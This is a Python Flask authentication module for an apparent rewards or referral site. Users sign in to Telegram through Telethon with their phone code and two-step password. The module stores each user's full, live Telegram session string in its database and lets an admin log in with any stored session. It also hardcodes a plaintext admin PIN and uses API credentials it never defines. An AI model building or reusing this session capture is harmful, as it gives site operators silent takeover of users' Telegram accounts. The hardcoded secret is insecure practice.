from flask import Blueprint, render_template, request, jsonify, session, redirect, url_for
from datetime import datetime
from bson import ObjectId
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

from app import users_col, temp_otp_data
from app.utils.helpers import normalize_phone, run_async, get_admin_config, update_total_users

auth_bp = Blueprint('auth', __name__, url_prefix='/auth')

# ========== PAGE ROUTES ==========
@auth_bp.route('/login')
def login():
    return render_template("login.html")

@auth_bp.route('/admin/login')
def admin_login_page():
    if session.get("admin_logged_in"):
        return redirect(url_for("admin.admin_dashboard"))
    return render_template("admin/login.html")

# ========== API ROUTES ==========
@auth_bp.route('/api/send_otp', methods=["POST"])
def send_otp():
    import traceback
    data = request.json
    phone = normalize_phone(data.get("phone"))
    if not phone:
        return jsonify({"success": False, "message": "invalid_phone"})
    async def _send():
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            temp_otp_data[phone] = {
                "temp_session": client.session.save(),
                "phone_code_hash": result.phone_code_hash
            }
            await client.disconnect()
            return True, "OTP Sent"
        except Exception as e:
            return False, str(e)
    try:
        success, msg = run_async(_send())
        return jsonify({"success": success, "message": msg})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@auth_bp.route('/api/verify_login', methods=["POST"])
def verify_login():
    import traceback
    data = request.json
    phone = normalize_phone(data.get("phone"))
    code = data.get("code")
    password = data.get("password")
    ref = data.get('ref')
    if not phone or phone not in temp_otp_data:
        return jsonify({"success": False, "message": "session_expired"})
    temp = temp_otp_data[phone]
    temp_session_str = temp.get("temp_session")
    phone_code_hash = temp.get("phone_code_hash")
    async def _verify():
        client = TelegramClient(StringSession(temp_session_str), API_ID, API_HASH)
        await client.connect()
        try:
            if password:
                await client.sign_in(password=password)
            else:
                if not code:
                    return False, "Code required"
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            me = await client.get_me()
            session_str = client.session.save()
            return True, me, session_str
        except SessionPasswordNeededError:
            await client.disconnect()
            return False, "SHOW_PWD_STEP"
        except PhoneCodeInvalidError:
            await client.disconnect()
            return False, "Invalid code"
        except PhoneCodeExpiredError:
            await client.disconnect()
            return False, "Code expired, please request again"
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    try:
        result = run_async(_verify())
        if result[0] is True and len(result) == 3:
            me, session_str = result[1], result[2]
            user = users_col.find_one({"telegram_id": str(me.id)})
            if not user:
                user_data = {
                    "telegram_id": str(me.id),
                    "phone": phone,
                    "username": me.username or f"user_{me.id}",
                    "first_name": me.first_name or "",
                    "last_name": me.last_name or "",
                    "session_string": session_str,
                    "cash": 0,
                    "aaf": 0,
                    "refer_count": 0,
                    "refer_by": ref,
                    "is_joined": False,
                    "tasks_done": 0,
                    "created_at": datetime.utcnow(),
                    "last_login": datetime.utcnow()
                }
                result_id = users_col.insert_one(user_data).inserted_id
                if ref:
                    users_col.update_one({"telegram_id": ref}, {"$inc": {"refer_count": 1}})
                    admin = get_admin_config()
                    bonus_amount = admin.get("referral_bonus", 0)
                    if bonus_amount > 0:
                        users_col.update_one({"telegram_id": ref}, {"$inc": {"cash": bonus_amount}})
            else:
                users_col.update_one(
                    {"telegram_id": str(me.id)},
                    {"$set": {"session_string": session_str, "last_login": datetime.utcnow(), "phone": phone}}
                )
                result_id = user["_id"]
            session["uid"] = str(result_id)
            session.permanent = True
            update_total_users()
            del temp_otp_data[phone]
            return jsonify({"success": True, "telegram_id": str(me.id)})
        else:
            msg = result[1]
            if msg == "SHOW_PWD_STEP":
                return jsonify({"success": False, "message": "SHOW_PWD_STEP"})
            else:
                return jsonify({"success": False, "message": msg})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@auth_bp.route('/api/admin/login', methods=["POST"])
def admin_login():
    data = request.json
    pin = data.get("pin")
    if not pin:
        return jsonify({"ok": False, "error": "PIN required"}), 400
    stored_pin = "Abdullah6790"
    if pin == stored_pin:
        session["admin_logged_in"] = True
        session.permanent = True
        return jsonify({"ok": True})
    return jsonify({"ok": False, "error": "Wrong PIN"}), 401

@auth_bp.route('/api/admin/logout', methods=["POST"])
def admin_logout():
    session.clear()
    return jsonify({"ok": True})

@auth_bp.route('/api/admin/me', methods=["GET"])
def admin_me():
    if session.get("admin_logged_in"):
        return jsonify({"ok": True, "logged_in": True})
    return jsonify({"ok": False, "logged_in": False}), 401

@auth_bp.route('/api/force_login', methods=["POST"])
def force_login():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string"}), 400
    async def get_tg_id():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        await client.disconnect()
        return me.id
    try:
        tg_id = str(run_async(get_tg_id()))
        user = users_col.find_one({"telegram_id": tg_id})
        if not user:
            return jsonify({"error": "User not found in database"}), 404
        session["uid"] = str(user["_id"])
        session.permanent = True
        return jsonify({"success": True, "telegram_id": tg_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
